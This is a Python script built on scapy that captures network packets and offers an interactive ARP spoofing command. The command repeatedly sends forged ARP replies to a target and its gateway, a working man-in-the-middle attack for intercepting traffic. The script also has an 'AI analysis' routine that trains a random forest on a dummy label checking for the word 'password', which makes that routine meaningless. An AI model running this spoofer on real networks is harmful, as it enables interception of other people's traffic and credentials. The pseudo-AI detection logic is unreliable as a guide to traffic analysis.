import scapy.all as scapy
import pandas as pd
import time
import threading
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import LabelEncoder
from sklearn.model_selection import train_test_split
import matplotlib.pyplot as plt

# Data storage for captured packets
data = []

# Function to get MAC address of a given IP
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return response[0][1].hwsrc if response else None

# Function to process captured packets
def process_packet(packet):
    global data
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        proto = packet[IP].proto
        length = len(packet)
        timestamp = time.time()

        if packet.haslayer(TCP):
            flags = packet[TCP].flags
            protocol = "TCP"
        elif packet.haslayer(UDP):
            flags = None
            protocol = "UDP"
        else:
            flags = None
            protocol = "Other"

        data.append([timestamp, src_ip, dst_ip, protocol, length, flags])
        print(f"Captured Packet: {src_ip} -> {dst_ip} [{protocol}] Length: {length}")

# Sniffer thread
def sniff_packets(interface):
    print("Starting packet sniffing...")
    scapy.sniff(iface=interface, prn=process_packet, store=False)

# Function to analyze packets with AI
def analyze_packets():
    global data
    if len(data) < 10:
        print("Not enough data for AI analysis.")
        return

    df = pd.DataFrame(data, columns=["Timestamp", "Source IP", "Destination IP", "Protocol", "Length", "Flags"])
    df.drop(columns=["Timestamp"], inplace=True)
    
    # Encoding categorical values
    encoder = LabelEncoder()
    df["Protocol"] = encoder.fit_transform(df["Protocol"])
    df.fillna(0, inplace=True)

    # Split data
    X = df.drop(columns=["Source IP", "Destination IP"])
    y = [1 if "password" in str(packet) else 0 for packet in data]  # Dummy AI logic for now
    
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
    
    model = RandomForestClassifier(n_estimators=100, random_state=42)
    model.fit(X_train, y_train)
    accuracy = model.score(X_test, y_test)
    print(f"AI Model Accuracy: {accuracy:.2f}")

# Function for ARP Spoofing attack
def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("Could not get MAC addresses. Exiting...")
        return
    
    print("Starting ARP Spoofing...")
    while True:
        try:
            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            time.sleep(2)
        except KeyboardInterrupt:
            print("Stopping ARP Spoofing...")
            break

# Main function
def main():
    interface = input("Enter network interface to sniff (e.g., eth0, wlan0): ")
    sniff_thread = threading.Thread(target=sniff_packets, args=(interface,))
    sniff_thread.start()
    
    while True:
        command = input("Enter command (analyze, arp_spoof, exit): ")
        if command == "analyze":
            analyze_packets()
        elif command == "arp_spoof":
            target_ip = input("Enter target IP: ")
            gateway_ip = input("Enter gateway IP: ")
            arp_spoof(target_ip, gateway_ip)
        elif command == "exit":
            print("Exiting...")
            break
        else:
            print("Invalid command.")

if __name__ == "__main__":
    main()
